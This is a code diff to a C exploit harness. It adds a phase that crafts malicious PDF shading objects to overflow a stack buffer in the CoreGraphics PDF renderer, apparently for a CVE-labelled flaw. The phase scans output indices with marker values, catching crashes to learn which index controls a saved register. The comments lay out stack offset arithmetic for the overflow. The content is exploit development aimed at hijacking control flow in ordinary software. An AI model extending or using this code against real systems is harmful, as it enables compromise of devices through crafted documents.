@@ -31248,12 +31248,93 @@ static void r508_exploit(void) {
     rlog("  Phase 5 complete\n\n");
     fflush(stdout);
 
+    rlog("  Phase 5 complete\n\n");
+    fflush(stdout);
+
+    /* ---- Phase 6: Index scan — which output controls x22? ---- */
+    rlog("--- Phase 6: Output index scan for x22 control ---\n");
+    rlog("  Testing marker values at different indices to find x22 source.\n");
+    rlog("  x22 had value 0x3FF0000000000000 (1.0) — the default C0/C1 value.\n");
+    rlog("  We'll put a unique marker at indices near the PoC's known slots\n");
+    rlog("  (1989=x24, 1990=loop count, 1991=mesh pointer for nOut=2000 VPR=129)\n");
+    rlog("  Our config: R=136, VPR=2 — different geometry, so indices differ.\n\n");
+    fflush(stdout);
+
+    /* Scan strategy: for R=136 with VPR=2, the stack VLA is small.
+       Record size = 2*4 (coords) + 8*ncomp_space (colour) = 8 + 8 = 16 bytes for Gray.
+       Wait — with Function, ncomp = R (the actual number of outputs written).
+       Record size per vertex = 8 (coords) + 8*R bytes (R doubles).
+       4 vertices * record_size = stack VLA.
+       The last vertex's output starts at offset 3*(8+8*R) + 8 from VLA start.
+       Outputs 0..135 for the last vertex overflow starting at VLA + 3*rec + 8 + 0.
+       The colour space is Gray (1 component), so the allocated record is 8+8=16 bytes,
+       but R=136 outputs are written = 136*8 = 1088 bytes. Overflow = 1088-8 = 1080 bytes.
+       The saved frame is above the VLA on the stack. With 4 records of 16 bytes = 64 bytes VLA,
+       the last record starts at offset 48. Its "colour" area starts at offset 56.
+       The first output (index 0) is at offset 56. Output 1 at 64, etc.
+       The stack frame's saved regs start just above the VLA (offset 64 for a 64-byte VLA).
+       So output index (64-56)/8 = 1 is the first saved register slot.
+
+       Let's binary-search: put a unique marker at specific indices and see which one
+       appears in the fault address. */
+
+    int test_indices[] = {0, 1, 2, 3, 4, 5, 10, 15, 20, 30, 50, 100, 130, 135};
+    int n_tests = sizeof(test_indices) / sizeof(test_indices[0]);
+
+    for (int t = 0; t < n_tests; t++) {
+        int idx = test_indices[t];
+        /* Use a unique marker: 0xDEAD0000_00000000 | (idx << 4) — recognizable pattern */
+        uint64_t test_marker = 0xDEAD000000000000ULL | ((uint64_t)idx << 4);
+
+        r508_fault_caught = 0;
+        r508_fault_addr = 0;
+
+        sigaction(SIGSEGV, &sa_new, NULL);
+        sigaction(SIGBUS, &sa_new, NULL);
+
+        if (sigsetjmp(r508_jmpbuf, 1) == 0) {
+            CFDataRef pdft = pdf_build_shading_pdf(2, 2, 136, idx, test_marker, 0);
+            CGDataProviderRef dpt = CGDataProviderCreateWithCFData(pdft);
+            CGPDFDocumentRef doct = CGPDFDocumentCreateWithProvider(dpt);
+            if (doct) {
+                CGPDFPageRef paget = CGPDFDocumentGetPage(doct, 1);
+                if (paget) {
+                    CGColorSpaceRef cst = CGColorSpaceCreateDeviceRGB();
+                    uint32_t *pixt = (uint32_t *)calloc(64 * 64, 4);
+                    CGContextRef ctxt = CGBitmapContextCreate(pixt, 64, 64, 8, 64 * 4, cst,
+                        (CGBitmapInfo)kCGImageAlphaPremultipliedLast);
+                    CGContextDrawPDFPage(ctxt, paget);
+                    rlog("  idx=%3d marker=0x%016llx => SURVIVED (no crash)\n",
+                        idx, (unsigned long long)test_marker);
+                    CGContextRelease(ctxt);
+                    CGColorSpaceRelease(cst);
+                    free(pixt);
+                }
+                CGPDFDocumentRelease(doct);
+            }
+            CGDataProviderRelease(dpt);
+            CFRelease(pdft);
+        } else {
+            uint64_t base = r508_fault_addr & ~0x1FULL; /* mask off +0xc offset */
+            int match = (base == (test_marker & ~0x1FULL));
+            rlog("  idx=%3d marker=0x%016llx => CRASH far=0x%016llx %s\n",
+                idx, (unsigned long long)test_marker,
+                (unsigned long long)r508_fault_addr,
+                match ? "*** MATCH — this index controls x22! ***" : "");
+        }
+        fflush(stdout);
+
+        sigaction(SIGSEGV, &sa_old_segv, NULL);
+        sigaction(SIGBUS, &sa_old_bus, NULL);
+    }
+
+    rlog("\n  Phase 6 complete\n\n");
+    fflush(stdout);
+
     rlog("=== SUMMARY ===\n");
-    rlog("  Phase 1: SKIPPED (confirmed crash)\n");
-    rlog("  Phase 2: Heap spill VPR=130 R=2000 (survived)\n");
-    rlog("  Phase 3: Heap spill VPR=130 R=9000 marker@1231 (survived)\n");
-    rlog("  Phase 4: DeviceCMYK R=9000 (survived — CMM splice not active in-app)\n");
-    rlog("  Phase 5: Stack route with signal handler (crash recovery test)\n\n");
+    rlog("  Phase 5: Signal handler caught crash at FAR=0x%llx\n",
+        (unsigned long long)r508_fault_addr);
+    rlog("  Phase 6: Index scan for x22 control\n\n");
 
     rlog("=== r508 (CVE-2026-112611) complete ===\n\n");
     fflush(stdout);
